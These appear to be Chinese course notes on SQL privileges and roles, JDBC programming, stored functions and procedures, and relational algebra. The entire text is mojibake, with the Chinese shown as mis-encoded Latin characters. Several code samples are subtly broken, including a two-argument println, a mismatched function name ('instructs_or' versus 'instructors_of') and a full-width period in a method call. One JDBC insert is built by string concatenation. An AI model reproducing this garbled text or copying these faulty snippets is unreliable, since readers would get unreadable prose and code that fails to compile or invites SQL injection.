\u003cç”¨æˆ·|è§’è‰²åˆ—è¡¨\u003eï¼šä¸€ä¸ªç”¨æˆ·id | publicï¼Œæ‰€æœ‰åˆæ³•ç”¨æˆ·æŒæœ‰æ‰€æˆæƒé™ | ä¸€ä¸ªè§’è‰²\nå¯¹äºæŸä¸ªè§†å›¾æˆæƒåï¼Œå¹¶æ²¡æœ‰å¯¹è¯¥è§†å›¾æ‰€åŸºäºçš„å…³ç³»æˆæƒ\næƒé™çš„æˆäºˆè€…å¿…é¡»å·²ç»æŒæœ‰ç›¸åº”çš„æƒé™ï¼ˆæˆ–è€…æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ï¼‰\n æƒé™åˆ—è¡¨ï¼š\n selectï¼šå…è®¸å¯¹å…³ç³»è¿›è¡Œè¯»è®¿é—®ï¼Œæˆ–è€…ä½¿ç”¨è§†å›¾è¿›è¡ŒæŸ¥è¯¢çš„èƒ½åŠ› insertï¼šæ’å…¥å…ƒç»„çš„èƒ½åŠ› updateï¼šæ›´æ–°å…ƒç»„çš„èƒ½åŠ› deleteï¼šåˆ é™¤å…ƒç»„çš„èƒ½åŠ› all privilegesï¼šæ‰€æœ‰å…è®¸æƒé™çš„ç®€å†™å½¢å¼  1 2 3  # ä¾‹ # å°†å¯¹å…³ç³»instructorçš„selectæƒé™æˆäºˆç”¨æˆ·U1U2U3 grant select on instructor to User1,User2,User3    revokeè¯­å¥ç”¨äºæ”¶å›æƒé™\n1 2  revoke\t\u003cæƒé™åˆ—è¡¨\u003e on\t\u003cå…³ç³»å|è§†å›¾å\u003e\tfrom\t\u003cç”¨æˆ·|è§’è‰²åˆ—è¡¨\u003e   \u003cæƒé™åˆ—è¡¨\u003eå¯ä»¥æ˜¯allï¼Œè¡¨ç¤ºæ”¶å›è¢«æ”¶å›äººæŒæœ‰çš„æ‰€æœ‰æƒé™\nå¦‚æœ åŒ…å«publicçš„è¯ï¼Œåˆ™é™¤äº†æ˜¾å¼åœ°è¢«æˆäºˆæƒé™çš„ç”¨æˆ·å¤–ï¼Œæ‰€æœ‰çš„ç”¨æˆ·å°†å¤±å»æƒé™\nå¦‚æœåŒæ„æƒé™ç”±ä¸åŒæˆæƒäººä¸¤æ¬¡æˆäºˆåŒä¸€ç”¨æˆ·ï¼Œç”¨æˆ·åœ¨ä¸€æ¬¡æƒé™è¢«å›æ”¶åï¼Œä»ä¿æŒæœ‰æƒé™\næ”¶å›æƒé™æ—¶ï¼Œè‹¥è¯¥ç”¨æˆ·å·²å°†æƒé™æˆäºˆå…¶ä»–ç”¨æˆ·ï¼Œä¹Ÿä¸€å¹¶æ”¶å›\nè§’è‰² 1 2 3 4 5 6 7 8 9  create\trole\tinstructor grant\tinstructor\tto Amit # è§’è‰²å¯ä»¥è¢«æˆä»¥æƒé™ grant select on takes to instructor # è§’è‰²å¯ä»¥æˆä»¥ç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥è¢«æˆä»¥å…¶ä»–è§’è‰² create\trole\tteaching_assistant grant\tteaching_assistant to instructor # instructor ç»§æ‰¿teaching_assistantçš„æ‰€æœ‰æƒé™    è§’è‰²é“¾\n1 2 3  create role dean grant instructor to dean grant dean to Satoshi   è§†å›¾çš„æƒé™ 1 2 3 4 5 6  create view geo_instructor as ( select\t* from instructor where\tdept_name = 'Geology' ) grant\tselect on geo_instructor to geo_staff   referencesæƒé™åˆ›é€ å¤–ç \n1  grant references (dept_name) on department to Mariano   æƒé™çš„è½¬ç§»ï¼šwith grant option\næˆäºˆå…¶æƒé™å¹¶å…è®¸ç”¨æˆ·å¯ä»¥å°†æ­¤æƒé™æˆäºˆå…¶ä»–ç”¨æˆ·\n1  grant select on table_name to Alice with grant option   é«˜çº§SQL ä½¿ç”¨ç¨‹åºè®¾è®¡è¯­è¨€è®¿é—®æ•°æ®åº“   åŠ¨æ€SQL  JDBCå’ŒODBC   åµŒå…¥å¼SQL   APIï¼ˆApplication-program interfaceï¼‰ç”¨äºç¨‹åºå’Œæ•°æ®åº“æœåŠ¡å™¨ä¹‹é—´çš„äº¤äº’\nåº”ç”¨ç¨‹åºè°ƒç”¨ï¼šâ‘ ä¸æ•°æ®åº“æœåŠ¡å™¨è¿æ¥ï¼›â‘¡å‘æ•°æ®åº“æœåŠ¡å™¨å‘é€SQLå‘½ä»¤ï¼›â‘¢é€ä¸ªå–ç»“æœå…ƒç»„åˆ°ç¨‹åºå˜é‡\nODBCï¼ˆOpen Database Connectivityï¼‰ï¼šç”¨äºCï¼ŒC++ï¼ŒC#å’ŒVisual Basic\nJDBCï¼ˆJAVA Database Connectiveï¼‰ï¼šç”¨äºJava\nJDBC JDBCæ˜¯ä¸€ä¸ªæ”¯æŒSQLçš„Java APIï¼Œç”¨äºä¸æ•°æ®åº“ç³»ç»Ÿé€šä¿¡\nJDBCæ”¯æŒæŸ¥è¯¢å’Œæ›´æ–°æ•°æ®ã€æ£€ç´¢æŸ¥è¯¢ç»“æœç­‰å¤šç§åŠŸèƒ½\nJDBCä¹Ÿæ”¯æŒå…ƒæ•°æ®æ£€ç´¢ï¼Œä¾‹å¦‚æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸­çš„å…³ç³»ã€å…³ç³»å±æ€§çš„åå­—å’Œç±»å‹\n ä¸æ•°æ®åº“çš„é€šä¿¡æ¨¡å‹\n æ‰“å¼€ä¸€ä¸ªè¿æ¥ åˆ›å»ºä¸€ä¸ªstatementå¯¹è±¡ ä½¿ç”¨statementå¯¹è±¡æ‰§è¡ŒæŸ¥è¯¢ï¼Œå‘é€æŸ¥è¯¢å¹¶å–å›ç»“æœ å¤„ç†é”™è¯¯çš„å¼‚å¸¸å¤„ç†æœºåˆ¶   JDBCçš„åŸºæœ¬å·¥ä½œæ­¥éª¤å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  public\tstatic\tvoid\tJDBCExample(String dbid,String userid,String passwd){ try{ //1.Load the JDBC driver class  Class.forName(\"oracle.jdbc.driver.OracleDriver\"); //2.Open a database connection  //\tjdbc:database_type:mode:URI  //\tdatabase_type = [mysql,oracle,...]  //\toracle:URI: @URI  //\tmysql:URI:\t//URI  Connection\tconn = DriverManager.getConnection( \"jdbc:oracle:thin:@URI\", userid, passwd); //3.Issue SQL statements  Statement\tstmt = conn.createStatement(); /* *\t4.Process result set *\tDo\tActual\tWork */ stmt.close(); conn.close(); }catch\t(SQLException\tsqle){ System.out.println(\"SQLException: \" + sqle); } } ------------------------------------------------------------------ //Actual Work //update stmt.executeUpdate(\"insert into instructor values('\" + a1 + \"', 'Kim','Physics',98000)\"); //query Result rset = stmt.executeQuery(\"Select dept_name ,avg(salary) from instructor group by dept_name\"); while(rset.next()){ System.out.println(rset.getString(\"dept_name\") + \"\\t\" + rset.getFloat(2)); } //null rset.wasNull() = true;   JDBCï¼šç«‹å³æ‰§è¡ŒVSé¢„å¤‡è¯­å¥  ç«‹å³æ‰§è¡Œ  ä½¿ç”¨Statementç±»ï¼Œå°†SQLè¯­å¥ç›´æ¥äº¤ç»™DBMSæ‰§è¡Œ ä¸€æ¬¡è¯­å¥æ‰§è¡ŒDBMSè¿›è¡Œä¸€æ¬¡è¯­å¥ç¼–è¯‘   ä½¿ç”¨é¢„å¤‡è¯­å¥æ‰§è¡Œ  ä½¿ç”¨PreparedStatementç±»ï¼ŒSQLè¯­å¥æ‰§è¡Œï¼Œé¦–å…ˆè¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘ç»“æœèµ‹äºˆPreparedStatementçš„å¯¹è±¡ é¢„ç¼–è¯‘çš„ç»“æœå¯è¢«åå¤å¤šæ¬¡æ‰§è¡Œ åŒåµŒå…¥SQLé¢„ç¼–è¯‘ä¸åŒï¼ˆåœ¨ç¼–è¯‘ç¨‹åºæ—¶è¿›è¡Œï¼‰ï¼ŒJDBCçš„é¢„ç¼–è¯‘æ—¶åœ¨ç¨‹åºè¿è¡Œä¸­è¿›è¡Œçš„   ä¸€ä¸ªSQLå¤šæ¬¡æ‰§è¡Œ  ä½¿ç”¨é¢„å¤‡è¯­å¥ï¼Œä»…ç¼–è¯‘ä¸€æ¬¡ ç«‹å³æ‰§è¡Œçš„æ¨¡å¼ä¸‹ï¼Œéœ€å¤šæ¬¡ç¼–è¯‘ åœ¨ä¸€SQLå¤šæ¬¡æ‰§è¡Œæ—¶ï¼Œä½¿ç”¨é¢„å¤‡è¯­å¥æ¯”ç«‹å³æ‰§è¡Œçš„    1 2 3 4 5 6 7 8 9 10 11  // é¢„å¤‡è¯­å¥ PreparedStatement\tpStmt = conn.prepareStatement( \"insert into instructor values(?,?,?,?)\"); pStmt.setString(1,\"88888\"); pStmt.setString(2,\"Alice\"); pStmt.setString(3,\"Finance\"); pStmt.setInt(4,1250000); pStmt.executeUpdate(); pStmt.setString(1,\"88888\"); pStmt.executeUpdate();   å¯¹äºæŸ¥è¯¢ï¼Œä½¿ç”¨pStmt.executeQuery()ï¼Œè¿”å›ä¸€ä¸ªç»“æœé›†ï¼ˆResultSetï¼‰\nå°†ä¸€ä¸ªæ¥è‡ªç”¨æˆ·çš„è¾“å…¥æ·»åŠ åˆ°æŸ¥è¯¢æ—¶ï¼Œä½¿ç”¨é¢„å¤‡è¯­å¥æ¯”è¾ƒå¥½\nSQLè¯­å¥çš„é¢„ç¼–è¯‘èƒ½å¤Ÿæœ‰æ•ˆé˜²æ­¢SQLæ³¨å…¥\nå…ƒæ•°æ®ç‰¹æ€§ ResultSetï¼šå…ƒæ•°æ®ï¼šæè¿°æ•°æ®çš„æ•°æ®\n1 2 3 4 5 6  ResultSet rs;//æ‰§è¡Œå®ŒæŸ¥è¯¢åå¾—åˆ°çš„ç»“æœ ResultSetMetaData rsmd = rsã€‚getMetaData(); for(int i = 1;i\u003c=rsmd.getColumnCount();i++){ System.out.println(rsmd.getColumnName(i)); System.out.println(rsmd.getColumnTypeName(i)); }   å¦‚ä¸Šï¼Œå°±æ˜¯ç”¨javaä»£ç è·å–å…ƒæ•°æ®çš„ä»£ç \næŸ¥è¯¢ç»“æœçš„å…ƒæ•°æ®ï¼šâ‘ å¯¹æè¿°æŸ¥è¯¢ç»“æœé›†çš„å±æ€§ç±»å‹ï¼ˆç»“æœé›†çš„æ¨¡å¼ï¼‰ï¼›â‘¡å¯¹ç¼–ç¨‹æ—¶ä¸èƒ½ç¡®å®šçš„ç»“æœé›†æ¨¡å¼æ—¶éå¸¸æœ‰ç”¨\n1 2 3 4 5 6 7 8 9 10  DatabaseMetaData dbmd = conn.getMetaData(); ResultSet rs = dbmd.getColumns(null, \"univdb\", \"department\", \"%\"); // Arguments to getColumns: Catalog, Schema-pattern, Table-pattern, \t// and Column-Pattern \t// Returns: One row for each column; row has a number of attributes \t// such as COLUMN_NAME, TYPE_NAME while(rs.next()) { System.out.println(rs.getString(\"COLUMN_NAME\"),rs.getString(\"TYPE_NAME\")); }   DatabaseMetaDataç±»ï¼šJDBCçš„ä¸€ä¸ªç±»ï¼Œå¯¹DBæ•°æ®å­—å…¸è¿›è¡Œå°è£…ï¼Œç±»æ–¹æ³•å¯ä»¥è¯»å–æ•°æ®å­—å…¸å…ƒæ•°æ®ï¼Œå±è”½äº†æ•°æ®å­—å…¸çš„å…·ä½“å®ç°æ¨¡å¼ï¼Œå¯¹åº”ç”¨æä¾›äº†è®¿é—®DBæ•°æ®å­—å…¸å…ƒæ•°æ®çš„æ ‡å‡†æ–¹æ³•\nJDBCçš„äº‹åŠ¡æ§åˆ¶ åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªSQLè¯­å¥éƒ½è¢«ä½œä¸ºä¸€ä¸ªè¢«è‡ªåŠ¨æäº¤çš„ç‹¬ç«‹çš„äº‹åŠ¡\nå¯¹äºæœ‰å¤šä¸ªæ›´æ–°çš„äº‹åŠ¡ï¼Œè¿™ç§åšæ³•å¹¶ä¸å¥½\nå¯ä»¥é€šè¿‡ä»£ç å…³é—­è‡ªåŠ¨æäº¤ï¼šconn.setAutoCommit(false);\näº‹åŠ¡å¿…é¡»è¢«æ˜¾å¼çš„æäº¤æˆ–å›æ»šï¼šconn.commit();æˆ–conn.rollback();\næ‰“å¼€è‡ªåŠ¨æäº¤ï¼šconn.setAutoCommit(true);\nè°ƒç”¨å‡½æ•°å’Œè¿‡ç¨‹ 1 2 3  CallableStatement cStmt1 = conn.prepareCall(\"{? = call some function(?)}\"); CallableStatement cStmt2 = conn.prepareCall(\"{call some procedure(?,?)}\");   å¤„ç†å¤§å‹å¯¹è±¡ç±»å‹ getBlob()å’ŒgetClob()ä¸getString()æ–¹æ³•ç±»ä¼¼ï¼Œä½†æ˜¯åˆ†åˆ«è¿”å›Blobå’ŒClobå¯¹è±¡\né€šè¿‡getBytes()ä»è¿™äº›å¯¹è±¡é‡Œå¾—åˆ°æ•°æ®\nå°†ä¸€ä¸ªå¼€æ”¾çš„æµåŸŸJava Blobæˆ–Clobå¯¹è±¡ç›¸è¿ï¼Œæ¥æ›´æ–°å¤§å¯¹è±¡\n1  blob.setBlob(int parameterIndex, InputStream inputStream);   SQLJ ç”±äºJDBCçš„åŠ¨æ€åŒ–ï¼Œç¼–è¯‘å™¨æ— æ³•æ•æ‰å…¶é”™è¯¯ï¼Œå› æ­¤æœ‰SQLJ\nSQLJï¼šåœ¨javaä¸­çš„åµŒå…¥å¼SQL\n1 2 3 4 5 6 7 8 9 10 11  #sql iterator deptInfoIter ( String dept name, int avgSal); deptInfoIter iter = null; #sql iter = { select dept_name, avg(salary) from instructor group by dept name }; while (iter.next()) { String deptName = iter.dept_name(); int avgSal = iter.avgSal(); System.out.println(deptName + \" \" + avgSal); } iter.close();   ODBC ODBCç»“æ„å¦‚ä¸Šå›¾\nODBCï¼šOpen Database Connectivityæ ‡å‡†ï¼š\n åº”ç”¨ç¨‹åºä¸æ•°æ®åº“æœåŠ¡å™¨é€šä¿¡æ ‡å‡† åº”ç”¨ç¨‹åºæ¥å£  ä¸æ•°æ®åº“å»ºç«‹ä¸€ä¸ªè¿æ¥ å‘é€æŸ¥è¯¢å’Œæ›´æ–°æ•°æ®åº“çš„è¯­å¥ å–å›ç»“æœ    ï¼ˆç•¥ï¼‰\nåµŒå…¥å¼SQL SQLæ ‡å‡†å®šä¹‰äº†è®¸å¤šè¯­è¨€çš„åµŒå…¥å¼SQLï¼Œå¦‚Cï¼ŒJAVAï¼ŒCobol\nSQLæŸ¥è¯¢æ‰€åµŒå…¥çš„è¯­è¨€è¢«ç§°ä¸ºå®¿ä¸»è¯­è¨€ï¼ˆhost languageï¼‰ï¼Œå®¿ä¸»è¯­è¨€ä¸­ä½¿ç”¨çš„SQLç»“æ„è¢«ç§°ä¸ºåµŒå…¥å¼SQL\nè¿™äº›è¯­è¨€çš„åŸºæœ¬å½¢å¼éµå¾ªSystem Rçš„åµŒå…¥åˆ°PL/Içš„SQLçš„å½¢å¼\nï¼ˆç•¥ï¼‰\nå‡½æ•°å’Œè¿‡ç¨‹å’Œç»“æ„ SQLï¼š1999æ”¯æŒå‡½æ•°å’Œè¿‡ç¨‹\n å‡½æ•°/è¿‡ç¨‹å¯ä»¥ç”¨SQLè‡ªèº«å†™ï¼Œä¹Ÿå¯ä»¥ç”¨å¤–éƒ¨ç¼–ç¨‹è¯­è¨€å†™ å‡½æ•°å¯¹ä¸“é—¨çš„æ•°æ®ç±»å‹ï¼Œå¦‚å›¾åƒå’Œå‡ ä½•å¯¹è±¡ç‰¹åˆ«æœ‰ç”¨ è®¸å¤šæ•°æ®åº“ç³»ç»Ÿæ”¯æŒè¡¨å€¼å‡½æ•°ï¼ˆtable-valued functionsï¼‰ï¼Œè¡¨å€¼å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªå…³ç³»ä½œä¸ºç»“æœ  SQLï¼š1999æ”¯æŒè®¸å¤šå‘½ä»¤å¼ç»“æ„ï¼ŒåŒ…æ‹¬å¾ªç¯ï¼ˆloopsï¼‰ã€if-then-elseã€èµ‹å€¼ï¼ˆassignmentï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # å®šä¹‰ä¸€ä¸ªå‡½æ•°,è¾“å…¥ä¸€ä¸ªç³»çš„åå­—,è¿”å›è¯¥ç³»çš„æ•™å¸ˆæ•°é‡ create\tfunction\tdept_count(dept_name\tvarchar(20)) returns\tinteger begin declare\td_count\tinteger; select\tcount(*)\tinto\td_count from\tinstructor where\tinstructor.dept_name = dept_name return d_count; end # æ‰¾å‡ºæ•™å¸ˆæ•°å¤§äº12çš„æ‰€æœ‰ç³»çš„åç§°å’Œé¢„ç®— select\tdept_name,budget from department where\tdept_count(dept_name) \u003e 12   SQLï¼š2003å¢åŠ äº†è¿”å›å…³ç³»ä½œä¸ºç»“æœçš„å‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # è¿”å›ä¸€ä¸ªåŒ…å«ç‰¹å®šç³»çš„æ‰€æœ‰æ•™å¸ˆçš„è¡¨ create\tfunction\tinstructors_of\t(dept_name\tchar(20)) returns\ttable\t(ID\tvarchar(5), name varchar(20), dept_name varchar(20), salary\tnumeric(8,2)) return table (select ID,name,dept_name,salary from\tinstructor where\tinstructor.dept_name = instructors_of.dept_name) #use select * from\ttable\t(instructs_or('Music'))   dept_countå‡½æ•°ä¹Ÿå¯ä»¥å†™æˆä¸€ä¸ªè¿‡ç¨‹\n1 2 3 4 5 6 7 8 9 10 11 12 13  create procedure dept_count_proc (in dept_name varchar(20), out d_count integer) begin select count(*) into d_count from instructor where instructor.dept_name = dept_count_proc.dept_name end # å¯ä»¥åœ¨ä¸€ä¸ªSQLè¿‡ç¨‹ä¸­æˆ–è€…åµŒå…¥å¼SQLä¸­ä½¿ç”¨callè¯­å¥è°ƒç”¨è¿‡ç¨‹ declare\td_count\tinteger; call\tdept_count_proc('Physics',d_count);   è¿‡ç¨‹å’Œå‡½æ•°å¯ä»¥é€šè¿‡åŠ¨æ€SQLè§¦å‘\nSQL:1999ï¼šå…è®¸ä½¿ç”¨å¤šä¸ªåŒåè¿‡ç¨‹/å‡½æ•°ï¼ˆç§°ä¸ºåå­—é‡è½½ï¼‰ï¼Œåªè¦å‚æ•°çš„ä¸ªæ•°ä¸åŒï¼Œæˆ–å¯¹äºé‚£äº›æœ‰ç›¸åŒå‚æ•°ä¸ªæ•°çš„å‡½æ•°ï¼Œè‡³å°‘æœ‰ä¸€ä¸ªå‚æ•°çš„ç±»å‹ä¸åŒ\nè§¦å‘å™¨ ï¼ˆç•¥ï¼‰\nå½¢å¼åŒ–å…³ç³»æŸ¥è¯¢è¯­è¨€ å…³ç³»ä»£æ•°  å…³ç³»ä»£æ•° å…­ç§åŸºæœ¬è¿ç®—ç¬¦  é€‰æ‹©ï¼ˆSelectï¼‰ï¼šÏƒ æŠ•å½±ï¼ˆProjectï¼‰ï¼šÎ  å¹¶ï¼ˆunionï¼‰ï¼šâˆª é›†åˆå·®ï¼ˆset differenceï¼‰ï¼š- ç¬›å¡å„¿ç§¯ï¼ˆCartesian productï¼‰ï¼šÃ— æ›´åï¼ˆrenameï¼‰ï¼šÏ   å…³ç³»ä»£æ•°çš„è¿ç®—ä»¥ä¸€ä¸ªæˆ–ä¸¤ä¸ªå…³ç³»ä½œä¸ºè¾“å…¥ï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„å…³ç³»ä½œä¸ºç»“æœ  é€‰æ‹©è¿ç®—   è®°æ³•ï¼šÏƒp(r)\n  pè¢«ç§°ä¸ºé€‰æ‹©è°“è¯\n  å®šä¹‰ä¸ºï¼š Ïƒp(r) = { t | t âˆˆ r and p(t) }ï¼Œå…¶ä¸­pæ˜¯ä¸€ä¸ªå‘½é¢˜æ¼”ç®—å…¬å¼ï¼Œç”±è¿è¯ï¼ˆâˆ§(and)ï¼Œâˆ¨(or)ï¼Œ â”(not)ï¼‰æŠŠé¡¹è¿æ¥èµ·æ¥æ„æˆæ¯ä¸€ä¸ªé¡¹ï¼ˆtermï¼‰çš„å½¢å¼å¯ä»¥ä¸ºï¼š\u003cattribute\u003e op \u003cattribute\u003e or \u003cconstant\u003e ï¼Œå…¶ä¸­opå¯ä»¥æ˜¯ï¼š=ï¼Œâ‰ ï¼Œ\u003eï¼Œâ‰¥ï¼Œ\u003cï¼Œâ‰¤\n  ç¤ºä¾‹ï¼šÏƒ dept_name = \"Physics\"(instructor)\n  é€‰æ‹©è¿ç®—æ˜¯ä»è¡Œçš„è§’åº¦è¿›è¡Œçš„è¿ç®—\næŠ•å½±è¿ç®—  è®°æ³•ï¼šÎ A1,A2,...,Ak(r) ï¼Œå…¶ä¸­A1,A2,...,Ak æ˜¯å±æ€§åï¼Œræ˜¯å…³ç³»å ç»“æœç”±é€‰æ‹©çš„kåˆ—ç»„æˆï¼Œåˆ é™¤äº†æ²¡æœ‰è¢«é€‰æ‹©çš„å…¶ä»–åˆ— å› ä¸ºå…³ç³»æ˜¯é›†åˆï¼Œæ‰€ä»¥é‡å¤çš„å…ƒç»„ä»ç»“æœä¸­åˆ é™¤ ç¤ºä¾‹ï¼šÎ ID, name, salary(instructor)  æŠ•å½±æ“ä½œä¸»è¦æ˜¯ä»åˆ—çš„è§’åº¦è¿›è¡Œè¿ç®—\nå¹¶è¿ç®—  è®°æ³•ï¼šr âˆª s å®šä¹‰ä¸ºï¼šr âˆª s = { t | t âˆˆ r or t âˆˆ s } è¦ä½¿å¹¶è¿ç®—râˆªsæœ‰æ„ä¹‰  rï¼Œså¿…é¡»æ˜¯åŒå…ƒçš„ï¼ˆå±æ€§æ•°ç›®å¿…é¡»ç›¸åŒï¼‰ å±æ€§çš„åŸŸå¿…é¡»ç›¸å®¹ï¼ˆå¦‚rçš„ç¬¬äºŒåˆ—çš„å±æ€§ç±»å‹å¿…é¡»å’Œsçš„ç¬¬äºŒåˆ—ç±»å‹ç›¸åŒï¼‰   ç¤ºä¾‹ï¼šæ‰¾å‡ºå¼€è®¾åœ¨2009å¹´ç§‹å­£å­¦æœŸæˆ–è€…2010å¹´æ˜¥å­£å­¦æœŸæˆ–è€…è¿™äºŒè€…çš†å¼€çš„æ‰€æœ‰çš„è¯¾ç¨‹ï¼š Î course_id (Ïƒ semester = â€œFallâ€ Î› year=2009 (section) ) âˆª Î course_id (Ïƒ semester=â€œSpringâ€ Î› year=2010 (section) )  é›†åˆå·®è¿ç®—  è®°æ³•ï¼šr - s å®šä¹‰ä¸ºï¼šr - s = { t | t âˆˆ r and t âˆ‰ s } å¿…é¡»ä¿è¯é›†åˆå·®è¿ç®—åœ¨ç›¸å®¹çš„å…³ç³»é—´è¿›è¡Œ  r å’Œ så¿…é¡»æ˜¯åŒå…ƒçš„ r å’Œ så±æ€§çš„åŸŸå¿…é¡»ç›¸å®¹   ç¤ºä¾‹ï¼šæ‰¾å‡ºå¼€è®¾åœ¨2009å¹´ç§‹å­£å­¦æœŸä½†æ˜¯åœ¨2010å¹´æ˜¥å­£å­¦æœŸä¸å¼€çš„è¯¾ç¨‹ï¼š Î course_id (Ïƒ semester = â€œFallâ€ Î› year=2009 (section) ) - Î course_id (Ïƒ semester=â€œSpringâ€ Î› year=2010 (section) )  åŸºæœ¬è¿ç®—çš„åˆ†é…å¾‹  æŠ•å½±å’Œå¹¶å¯ä»¥åˆ†é…  Î pid,name(SâˆªT) â‰¡ Î pid,name(S) âˆª Î pid,name(T)   æŠ•å½±å’Œå·®ä¸å¯åˆ†é…  ç¬›å¡å„¿ç§¯è¿ç®—   è®°æ³•ï¼šr Ã— s\n  å®šä¹‰ä¸ºï¼šr Ã— s = { tq | t âˆˆ r and qâˆˆ s }\n å…ƒç»„çš„è¿ä¸²ï¼ˆConcatenationï¼‰ï¼šè‹¥r = (r1,..,rn)ï¼Œs = (s1,...,sm)ï¼Œåˆ™å®šä¹‰rä¸sçš„è¿ä¸²ä¸ºä¸€ä¸ªn+mçš„å…ƒç»„ï¼Œè®°ä½œrs = (r1,...,rn,s1,s...,sm)    å‡è®¾å…³ç³»r(R)å’Œs(S)çš„å±æ€§ä¸ç›¸äº¤ï¼ˆå³R âˆ© S = Î¦ ï¼‰\n  å¦‚æœå…³ç³»r(R)å’Œs(S)çš„å±æ€§æœ‰ç›¸äº¤çš„ï¼Œåˆ™å¿…é¡»ä½¿ç”¨æ›´åè¿ç®—\n  ç¤ºä¾‹ï¼š\n  è¿ç®—çš„ç»„åˆ å¦‚å›¾ä¸ºä¸€ä¸ªä¾‹å­\næ›´åè¿ç®—  å…è®¸é€šè¿‡æ›´åæ¥å¼•ç”¨å…³ç³»ä»£æ•°è¡¨è¾¾å¼çš„ç»“æœ å…è®¸å¼•ç”¨ä¸€ä¸ªå…³ç³»æ—¶ä½¿ç”¨å¤šäºä¸€ä¸ªçš„åå­— å¦‚ï¼š ÏX(E) ï¼šè¿”å›æ›´åä¸ºXçš„è¡¨è¾¾å¼Eçš„ç»“æœ å¦‚æœå…³ç³»ä»£æ•°è¡¨è¾¾å¼Eæ—¶nå…ƒçš„ï¼Œåˆ™ Ï Ï‡(A1,A2,...,An)(E) ï¼Œè¿”å›è¢«æ›´åä¸ºXçš„è¡¨è¾¾å¼Eçš„ç»“æœï¼Œå¹¶ä¸”å±æ€§è¢«æ›´åä¸ºA1ï¼ŒA2ï¼Œ...ï¼ŒAn  å…³ç³»ä»£æ•°è¡¨è¾¾å¼åµŒå¥—  å…³ç³»ä»£æ•°ä¸­åŸºæœ¬çš„è¡¨è¾¾å¼æ˜¯å¦‚ä¸‹äºŒè€…ä¹‹ä¸€ï¼š  æ•°æ®åº“ä¸­çš„ä¸€ä¸ªå…³ç³» ä¸€ä¸ªå¸¸æ•°å…³ç³»   nè®¾E1 å’ŒE2æ˜¯å…³ç³»ä»£æ•°è¡¨è¾¾å¼ï¼Œåˆ™ä»¥ä¸‹è¿™äº›éƒ½æ˜¯å…³ç³»ä»£æ•°è¡¨è¾¾å¼ï¼š  E1 âˆª E2 E1 â€“ E2 E1 x E2 Ïƒp (E1), å…¶ä¸­Pæ˜¯E1çš„å±æ€§ä¸Šçš„è°“è¯ Î s(E1),å…¶ä¸­S æ˜¯E1ä¸­æŸäº›å±æ€§çš„åˆ—è¡¨ Ïx (E1),å…¶ä¸­x æ˜¯E1ç»“æœçš„æ–°åå­—    é™„åŠ å…³ç³»ä»£æ•°è¿ç®—  é™„åŠ è¿è¾“æ²¡æœ‰å®è´¨åœ°æ‰©å±•å…³ç³»ä»£æ•°çš„èƒ½åŠ›ï¼Œä½†æ˜¯ç®€åŒ–äº†æŸ¥è¯¢çš„ä¹¦å†™  é›†åˆäº¤ è‡ªç„¶è¿æ¥ èµ‹å€¼ å¤–è¿æ¥     é›†åˆäº¤è¿ç®—  è®°æ³•ï¼šr âˆ© s å®šä¹‰ä¸ºï¼š r âˆ© s = { t | t âˆˆ r and t âˆˆ s }  r å’Œ s æ˜¯åŒå…ƒçš„ r å’Œ s å±æ€§åŸŸç›¸å®¹   æ³¨ï¼š r âˆ© s = r - ( r - s ) = s - ( s - r )  Î¸è¿æ¥ å®šä¹‰ï¼š\n æ‰€ä»¥ï¼ŒÎ¸è¿æ¥æ˜¯åšç¬›å¡å„¿ç§¯ï¼Œç„¶åç­›é€‰å‡ºç¬¦åˆAÎ¸Bè¡¨è¾¾å¼çš„å…ƒç»„ä½œä¸ºç»“æœè¿”å›  è‡ªç„¶è¿æ¥è¿ç®—  è®°æ³•ï¼šr â‹ˆ s å®šä¹‰ï¼šå…³ç³» r å’Œ s åˆ†åˆ«æ˜¯æ¨¡å¼ R å’Œ S çš„å…³ç³»ï¼Œåˆ™ r â‹ˆ s æ˜¯ç”±å¦‚ä¸‹æ–¹å¼å¾—åˆ°çš„æ¨¡å¼ R âˆª S çš„å…³ç³»  å¯¹äº r ä¸­çš„æ¯ä¸ªå…ƒç»„ tr å’Œ s ä¸­çš„æ¯ä¸ªå…ƒç»„ ts æ‰€ç»„æˆçš„å…ƒç»„å¯¹ å¦‚æœ tr å’Œ ts åœ¨ R âˆ© Sçš„å±æ€§ä¸Šæœ‰ç›¸åŒçš„å€¼ï¼Œåˆ™åœ¨ç»“æœä¸­åŠ å…¥ä¸€ä¸ªå…ƒç»„tï¼Œå¹¶ä¸”ï¼š  t åœ¨rä¸Šå’Œ tr æœ‰ç›¸åŒçš„å€¼ t åœ¨sä¸Šå’Œ ts æœ‰ç›¸åŒçš„å€¼     ç¤ºä¾‹ï¼šè‹¥R = (A,B,C,D) ï¼ŒS = (E,B,D) ï¼Œç»“æœæ¨¡å¼ = (A,B,C,D,E) ï¼Œåˆ™ r â‹ˆ s = Î r.A, r.B, r.C, r.D, s.E  ( Ïƒ r.B = s.B Î› r.D = s.D (r Ã— s ) )    è‡ªç„¶è¿æ¥å’Œç­‰å€¼è¿æ¥çš„ä¸åŒ\n è‡ªç„¶è¿æ¥ä¸­ç›¸ç­‰çš„åˆ†é‡å¿…é¡»æ˜¯ç›¸åŒçš„å±æ€§ç»„ï¼Œå¹¶ä¸”è¦åœ¨ç»“æœä¸­å»æ‰é‡å¤çš„å±æ€§ï¼ŒäºŒç­‰å€¼è¿æ¥åˆ™ä¸å¿…    å½“ R ä¸ S æ— ç›¸åŒå±æ€§æ—¶ï¼Œ R â‹ˆ S = R Ã— S\n  å¯äº¤æ¢ï¼Œå¯ç»“åˆ\n s â‹ˆ sc â‰¡ sc â‹ˆ s ( s â‹ˆ sc ) â‹ˆ c â‰¡ s â‹ˆ ( sc â‹ˆ c )    èµ‹å€¼è¿ç®—  